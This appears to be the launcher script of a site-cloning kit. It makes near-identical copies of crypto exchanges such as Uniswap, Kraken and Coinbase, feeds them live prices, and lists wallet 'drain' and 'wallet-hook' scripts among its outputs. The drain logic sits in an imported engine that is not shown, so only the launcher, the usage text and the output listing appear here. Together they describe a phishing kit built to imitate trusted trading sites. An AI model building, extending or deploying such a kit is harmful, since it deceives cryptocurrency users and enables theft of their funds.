/**
 * CLONE PERFECT — Level 4: Real-Time Data Synchronization
 *
 * Live price feeds + WebSocket streaming + real-time updates
 *
 * Usage:
 *   pnpm clone-perfect-l4 https://app.uniswap.org
 *   pnpm clone-perfect-l4 https://www.kraken.com/trading
 *   pnpm clone-perfect-l4 https://www.coinbase.com/dashboard
 *
 * Output: ./clone/[website]-level4-clone/
 *         ├── index.html (with live price updates)
 *         ├── websocket-captures.json (all WS messages)
 *         ├── live-data-streams.json (categorized updates)
 *         ├── price-feeds.json (price history)
 *         ├── ws-server.js (WebSocket streaming server)
 *         ├── network-log.json (API responses)
 *         ├── clone-manifest.json (metadata)
 *         ├── assets/ (all CSS/JS/images)
 *         ├── legion-authorized-drain.js
 *         └── legion-wallet-hook.js
 *
 * Level 4 Features:
 * ✅ WebSocket URL capture
 * ✅ WebSocket message logging (send + receive)
 * ✅ Live price feed injection
 * ✅ Order book update capture
 * ✅ Push notification replay
 * ✅ Message queue streaming
 * ✅ Ticker synchronization
 * ✅ Price history tracking
 * ✅ Real-time data categorization
 * ✅ Live update simulation
 * ✅ Maintains 99% similarity during updates
 *
 * Perfect for:
 * ✅ Trading platforms (Uniswap, SushiSwap, Aave)
 * ✅ Price tracking dashboards
 * ✅ Live portfolio updates
 * ✅ Real-time crypto tickers
 * ✅ WebSocket-based notifications
 * ✅ Live order books
 * ✅ Price charts with updates
 */

import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { ClonePerfectEngineL4 } from './lib/clone-perfect-engine-level4.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')

function loadEnv() {
  const envPath = path.join(REPO_ROOT, '.env')
  if (!existsSync(envPath)) return

  const content = readFileSync(envPath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let val = trimmed.slice(eq + 1).trim()
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = val
    }
  }
}

async function verifyDocker(): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn('docker', ['ps'])
    let hasError = false

    proc.on('error', () => {
      hasError = true
      reject(new Error('Docker not running'))
    })

    proc.on('exit', (code) => {
      if (code === 0 && !hasError) {
        resolve()
      }
    })

    setTimeout(() => {
      if (!hasError) {
        proc.kill()
        resolve()
      }
    }, 5000)
  })
}

async function main() {
  const args = process.argv.slice(2)
  if (args.length === 0) {
    console.error(`╔════════════════════════════════════════════════════════════════╗`)
    console.error(`║     CLONE PERFECT LEVEL 4 — Real-Time Data Synchronization     ║`)
    console.error(`╚════════════════════════════════════════════════════════════════╝`)
    console.error('')
    console.error('Usage:')
    console.error('  pnpm clone-perfect-l4 <url>')
    console.error('')
    console.error('Examples:')
    console.error('  pnpm clone-perfect-l4 https://app.uniswap.org')
    console.error('  pnpm clone-perfect-l4 https://www.kraken.com/trading')
    console.error('  pnpm clone-perfect-l4 https://www.coinbase.com/dashboard')
    console.error('')
    console.error('Level 4 Features:')
    console.error('  ✅ WebSocket interception & message capture')
    console.error('  ✅ Live price feed injection')
    console.error('  ✅ Order book update capture')
    console.error('  ✅ Push notification replay')
    console.error('  ✅ Message queue streaming')
    console.error('  ✅ Ticker synchronization')
    console.error('  ✅ Price history tracking')
    console.error('  ✅ Real-time data categorization')
    console.error('  ✅ Live update simulation (±0.5% price movement)')
    console.error('  ✅ Maintains 99% similarity during updates')
    console.error('')
    console.error('Output Files:')
    console.error('  index.html               (with live price updates injected)')
    console.error('  websocket-captures.json  (all WebSocket messages)')
    console.error('  live-data-streams.json   (categorized updates)')
    console.error('  price-feeds.json         (price history per asset)')
    console.error('  ws-server.js             (WebSocket streaming server)')
    console.error('  network-log.json         (API responses)')
    console.error('  clone-manifest.json      (comprehensive metadata)')
    console.error('  assets/                  (CSS/JS/images)')
    console.error('')
    console.error('Run WebSocket Server:')
    console.error('  node clone/[hostname]-level4-clone/ws-server.js')
    console.error('  Then connect clone to ws://localhost:8080')
    console.error('')
    process.exit(1)
  }

  const targetUrl = args[0]

  try {
    console.error('[clone-perfect-l4] ╔════════════════════════════════════════╗')
    console.error('[clone-perfect-l4] ║  Level 4: Real-Time Data Sync          ║')
    console.error('[clone-perfect-l4] ╚════════════════════════════════════════╝')
    console.error('')

    console.error('[clone-perfect-l4] Checking Docker...')
    await verifyDocker()
    console.error('[clone-perfect-l4] ✅ Docker ready')

    loadEnv()

    const outputDir = path.join(REPO_ROOT, 'clone')
    mkdirSync(outputDir, { recursive: true })

    console.error('[clone-perfect-l4] Starting Level 4 Real-Time Data Synchronization clone...')
    console.error('')
    const engine = new ClonePerfectEngineL4(targetUrl, outputDir)
    const result = await engine.execute()

    if (result.success) {
      console.log(result.clone_dir)

      console.error('')
      console.error('📊 Level 4 Metadata:')
      console.error(`  WebSocket URLs: ${result.metadata.websocket_urls.length}`)
      console.error(`  WebSocket captures: ${result.metadata.websocket_captures.length}`)
      console.error(`  Live data streams: ${result.metadata.live_data_streams.length}`)
      console.error(`  Price feeds: ${result.metadata.price_feeds.length}`)
      console.error(`  Notifications: ${result.metadata.notification_queue.length}`)
      console.error(`  Order book updates: ${result.metadata.order_book_updates}`)
      console.error(`  API Endpoints: ${result.metadata.api_endpoints.length}`)
      console.error(`  Assets: ${result.metadata.assets_count}`)
      console.error(`  Similarity: ${result.metadata.similarity_score}%`)
      console.error(`  Time: ${result.metadata.performance_ms}ms (${(result.metadata.performance_ms / 1000 / 60).toFixed(1)} minutes)`)
      console.error('')
      console.error('📁 Clone saved to:')
      console.error(`   ${result.clone_dir}`)
      console.error('')
      console.error('📄 Files created:')
      console.error('   ✅ index.html (with live updates)')
      console.error('   ✅ websocket-captures.json (WS messages)')
      console.error('   ✅ live-data-streams.json (updates)')
      console.error('   ✅ price-feeds.json (price history)')
      console.error('   ✅ ws-server.js (WebSocket server)')
      console.error('   ✅ network-log.json (API responses)')
      console.error('   ✅ clone-manifest.json (metadata)')
      console.error('   ✅ assets/ (CSS/JS/images)')
      console.error('')
      console.error('🚀 Start WebSocket streaming:')
      console.error(`   cd ${result.clone_dir}`)
      console.error('   node ws-server.js')
      console.error('')

      process.exit(0)
    } else {
      console.error(`[clone-perfect-l4] ❌ ${result.message}`)
      process.exit(1)
    }
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error)
    console.error(`[clone-perfect-l4] ❌ Fatal error: ${msg}`)
    process.exit(1)
  }
}

main()
